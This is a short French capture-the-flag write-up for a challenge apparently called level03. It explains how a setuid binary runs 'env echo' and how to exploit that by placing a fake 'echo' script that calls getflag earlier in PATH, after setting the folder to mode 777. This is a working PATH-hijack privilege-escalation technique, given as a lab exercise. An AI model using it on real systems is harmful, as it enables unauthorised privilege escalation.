ouverture de level03 (executable dans ghidra):
setresgid et setresuid avec l'user flag03
et ensuite la commande executée est /usr/bin/env echo Exploit me

il suffit de créer un executable nommée echo et le mettre plus tôt dans le PATH:

cd ..
chmod 777 level03
(set les permissions pour écrire dans notre home)
nano echo

#!/bin/bash

getflag

export PATH="/home/user/level03:$PATH"

chmod +x echo

./level03